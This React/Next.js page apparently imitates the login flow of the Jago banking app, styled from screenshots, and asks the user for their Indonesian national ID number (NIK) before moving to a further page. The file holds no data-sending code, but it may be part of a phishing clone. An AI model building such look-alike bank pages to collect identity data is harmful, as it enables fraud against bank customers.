"use client";

import React from "react";
import Link from "next/link";
import { ArrowLeft, CreditCard } from "lucide-react";
import { useApp } from "../../lib/AppContext";

/**
 * Jago NIK Input Page (page3) - Refined version according to the latest screenshot.
 */
export default function Page3() {
  const { appData, updateAppData } = useApp();
  const nik = appData.nik || "";

  return (
    <div className="relative min-h-screen w-full bg-[#FFB800] flex flex-col font-sans text-black overflow-hidden">
      
      {/* Top Navigation */}
      <header className="w-full px-4 py-8 flex items-center justify-between">
        <Link href="/page2" className="flex items-center gap-2 group">
          <ArrowLeft className="w-6 h-6 transition-transform group-hover:-translate-x-1" />
          <span className="text-xl font-bold">Log In</span>
        </Link>
        
        {/* Indonesia Flag Icon Mockup - Matches the screenshot more closely */}
        <div className="w-10 h-10 bg-[#333] rounded-full shadow-lg border border-slate-700 flex items-center justify-center p-0 overflow-hidden">
           <div className="flex flex-col w-full h-full">
             <div className="bg-amber-600 h-1/2 w-full" />
             <div className="bg-black h-1/2 w-full" />
           </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="px-6 pt-10 flex-1 flex flex-col">
        <div className="mb-10">
          <h1 className="text-3xl font-black mb-3 tracking-tight">Masukkan NIK kamu</h1>
          <p className="text-black/80 text-sm font-medium">
            Untuk lanjut, silakan masukkan NIK kamu.
          </p>
        </div>

        {/* Input Card */}
        <div className="bg-white rounded-2xl p-6 shadow-xl flex items-center gap-4 transition-all focus-within:ring-2 focus-within:ring-white/40">
          <div className="w-10 h-6 bg-slate-200 rounded flex items-center justify-center">
            <CreditCard className="w-5 h-5 text-slate-400" />
          </div>
          <input 
            type="number"
            value={nik}
            onChange={(e) => updateAppData({ nik: e.target.value })}
            placeholder="Masukkan NIK"
            className="flex-1 bg-transparent border-none focus:outline-none text-lg font-bold text-slate-800 placeholder:text-slate-400"
          />
        </div>
        
        {/* Lanjut Button - Guaranteed Solid Opaque Style */}
        <div className="mt-12 mb-10">
          <Link href="/page4" className="w-full">
            <button 
              disabled={!nik}
              className={`w-full py-5 rounded-2xl text-xl font-black transition-all duration-300 ${
                nik 
                ? 'bg-[#FFFFFF] text-black shadow-xl active:scale-95 cursor-pointer opacity-100' 
                : 'bg-white/20 text-white/40 cursor-not-allowed opacity-100'
              }`}
            >
              Lanjut
            </button>
          </Link>
        </div>
      </main>

      {/* Home Indicator Mockup */}
      <div className="bg-black w-24 h-1.5 rounded-full mx-auto mb-2 opacity-20" />
    </div>
  );
}
